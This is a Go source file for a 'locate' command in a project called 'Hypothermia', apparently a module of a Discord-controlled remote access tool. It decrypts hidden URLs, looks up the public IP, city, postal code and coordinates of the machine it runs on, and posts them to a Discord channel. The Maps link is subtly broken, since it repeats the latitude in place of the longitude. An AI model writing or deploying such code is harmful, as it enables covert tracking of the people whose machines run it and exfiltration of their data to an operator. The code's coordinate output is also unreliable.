package commands

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"

	"Hypothermia/src/utils/crypto"
	"github.com/bwmarrin/discordgo"
)

const (
	locateHttpError string = "🟥 Failed to make http request."
	locateReadError string = "🟥 Failed to read request body."
	locateJsonError string = "🟥 Failed to decode json."
)

const (
	url  string = "qTqlAl2Zt2wbRe2f3TPCvN9De5N+EhO6upbbEwDI8wntg4ipLfkQWwEq5jmXQN3N" // https://geolocation-db.com/json/
	maps string = "WUlTDoJ16EaJFVMLO15dZ2Ak2k21EH19ZTNy8FfMZ5mnsdF1g32FCuRYgTbjaAzh" // https://www.google.com/maps/place/
)

type LocationData struct {
	CountryCode string  `json:"country_code"`
	CountryName string  `json:"country_name"`
	City        string  `json:"city"`
	State       string  `json:"state"`
	Postal      string  `json:"postal"`
	Latitude    float32 `json:"latitude"`
	Longitude   float32 `json:"longitude"`
	IPv4        string  `json:"IPv4"`
}

func (*LocateCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	res, err := http.Get(utils_crypto.Decrypt(url))
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, locateHttpError, m.Reference())
		return
	}

	defer res.Body.Close()

	body, err := io.ReadAll(res.Body)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, locateReadError, m.Reference())
		return
	}

	var data LocationData
	err = json.Unmarshal(body, &data)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, locateJsonError, m.Reference())
		return
	}

	var info string
	info += "IP: " + data.IPv4 + "\n"
	info += "State: " + data.State + " (" + data.City + ")\n"
	info += "Country: " + data.CountryName + " (" + data.CountryCode + ")\n"
	info += "Postal Code: " + data.Postal + "\n"
	info += utils_crypto.Decrypt(maps) + fmt.Sprint(data.Latitude) + "," + fmt.Sprint(data.Latitude)

	s.ChannelMessageSendReply(m.ChannelID, info, m.Reference())
}

func (*LocateCommand) Name() string {
	return "locate"
}

func (*LocateCommand) Info() string {
	return "geolocates the user"
}

type LocateCommand struct{}
